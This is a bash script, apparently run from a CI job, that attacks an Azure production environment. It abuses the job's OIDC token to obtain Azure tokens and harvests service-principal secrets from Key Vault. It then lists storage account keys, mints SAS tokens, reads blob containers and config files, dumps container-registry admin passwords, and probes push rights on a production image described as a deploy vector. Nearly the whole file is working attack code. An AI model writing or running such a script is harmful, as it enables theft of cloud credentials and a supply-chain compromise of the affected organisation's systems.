#!/usr/bin/env bash
# Archive storage account (all principals + anon), ACR push/admin-creds (deploy vector), backup recheck.
set +e
SUB="$AZURE_SUBSCRIPTION_ID"; TEN="$AZURE_TENANT_ID"; RG="rg-tbl-platform-prod-sea"
ARCHIVE="sttblarchiveprodx3euoz"; BACKUP="sttblbackupprodx3euoz"; APPCFG="sttblappcfgprodx3euoz"
ACR="crtblplatprodx3euoz"; AUD="api://AzureADTokenExchange"; AV=2021-08-06
mint(){ curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r .value; }
oidc(){ curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer -d "client_assertion=$(mint)" --data-urlencode "scope=$1" | jq -r .access_token; }
spk(){ curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$1" -d grant_type=client_credentials -d "client_secret=$2" --data-urlencode "scope=$3" | jq -r .access_token; }
la(){ curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer -d "client_assertion=$(mint)" --data-urlencode "scope=$1" | jq -r .access_token; }
KVP=$(oidc "https://vault.azure.net/.default")
getsec(){ curl -s -H "Authorization: Bearer $KVP" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$1?api-version=7.4" | jq -r .value; }

# principal list name|appId|secret ; OIDC/LEGACY special
declare -a P=("OIDC|_oidc_|_" "legacy-admin|_legacy_|_")
for s in sync-service-principal secrets-sync-principal cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal; do
  S=$(getsec "$s"); P+=("$s|$(echo "$S"|jq -r .appId)|$(echo "$S"|jq -r .clientSecret)"); done
tok(){ case "$2" in _oidc_) oidc "$3";; _legacy_) la "$3";; *) spk "$2" "$3" "$4";; esac; }

echo "### listKeys on ARCHIVE + BACKUP + APPCFG for every principal"
for e in "${P[@]}"; do IFS='|' read -r N A K <<<"$e"
  T=$(tok "$N" "$A" "$K" "https://management.azure.com/.default"); [ ${#T} -lt 50 ] && { echo "  [$N] no mgmt tok"; continue; }
  for ACC in $ARCHIVE $BACKUP $APPCFG; do
    R=$(curl -s -X POST -H "Authorization: Bearer $T" -H "Content-Length: 0" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$ACC/listKeys?api-version=2023-05-01")
    KK=$(echo "$R"|jq -r '.keys[0].value // empty'); echo "  [$N] listKeys $ACC -> len=${#KK} err=$(echo "$R"|jq -r '.error.code//"none"')"
    if [ ${#KK} -gt 20 ]; then
      SAS=$(curl -s -X POST -H "Authorization: Bearer $T" -H "Content-Type: application/json" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$ACC/listAccountSas?api-version=2023-05-01" -d '{"signedServices":"b","signedResourceTypes":"sco","signedPermission":"rl","signedProtocol":"https","signedStart":"2026-10-22T00:00:00Z","signedExpiry":"2026-10-23T00:00:00Z"}' | jq -r .accountSasToken)
      echo "    *** $ACC containers: $(curl -s "https://$ACC.blob.core.windows.net/?comp=list&$SAS" | grep -o '<Name>[^<]*</Name>'|tr '\n' ' ')"
      for C in config archive backup data secrets; do echo "    $ACC/$C: $(curl -s "https://$ACC.blob.core.windows.net/$C?restype=container&comp=list&$SAS" | grep -o '<Name>[^<]*</Name>'|tr '\n' ' ')"; done
      echo "    $ACC/config/internal-config.json:"; curl -s "https://$ACC.blob.core.windows.net/config/internal-config.json?$SAS"; echo
    fi
  done
done

echo "### ARCHIVE data-plane read (storage token) per principal + anon"
for e in "${P[@]}"; do IFS='|' read -r N A K <<<"$e"
  T=$(tok "$N" "$A" "$K" "https://storage.azure.com/.default"); [ ${#T} -lt 50 ] && continue
  echo "  [$N] $ARCHIVE list -> $(curl -s -o /tmp/l -w '%{http_code}' -H "Authorization: Bearer $T" -H "x-ms-version: $AV" "https://$ARCHIVE.blob.core.windows.net/?comp=list") $(grep -o '<Name>[^<]*</Name>' /tmp/l|tr '\n' ' ')"
done
echo "  [anon] $ARCHIVE list -> $(curl -s -o /tmp/l -w '%{http_code}' -H "x-ms-version: $AV" "https://$ARCHIVE.blob.core.windows.net/?comp=list")"

echo "### ACR: admin-creds (listCredentials) + registry props per principal"
for e in "${P[@]}"; do IFS='|' read -r N A K <<<"$e"
  T=$(tok "$N" "$A" "$K" "https://management.azure.com/.default"); [ ${#T} -lt 50 ] && continue
  C=$(curl -s -o /tmp/cr -w '%{http_code}' -X POST -H "Authorization: Bearer $T" -H "Content-Length: 0" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.ContainerRegistry/registries/$ACR/listCredentials?api-version=2023-07-01")
  echo "  [$N] ACR listCredentials -> $C $( [ "$C" = 200 ] && jq -rc '{u:.username,p:(.passwords[0].value)}' /tmp/cr)"
done
echo "### ACR registry props (adminUserEnabled, anonymousPullEnabled):"
curl -s -H "Authorization: Bearer $(oidc https://management.azure.com/.default)" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.ContainerRegistry/registries/$ACR?api-version=2023-07-01" | jq '{adminUserEnabled:.properties.adminUserEnabled, anonymousPullEnabled:.properties.anonymousPullEnabled, publicNetworkAccess:.properties.publicNetworkAccess, sku:.sku.name}'

echo "### ACR push test (AAD exchange -> pull & push scope for tebamoto-reporting-api)"
AADACR=$(oidc "https://management.azure.com/.default")
RT=$(curl -s -X POST "https://$ACR.azurecr.io/oauth2/exchange" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=access_token&service=$ACR.azurecr.io&tenant=$TEN&access_token=$AADACR" | jq -r .refresh_token)
echo "  refresh_token len=${#RT}"
for SCOPE in "repository:tebamoto-reporting-api:pull" "repository:tebamoto-reporting-api:pull,push"; do
  AT=$(curl -s -X POST "https://$ACR.azurecr.io/oauth2/token" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&service=$ACR.azurecr.io&scope=$SCOPE&refresh_token=$RT" | jq -r '.access_token // .errors[0].code')
  echo "  scope[$SCOPE] -> token/err: ${AT:0:40} (len ${#AT})"
done
echo "=== DONE ==="
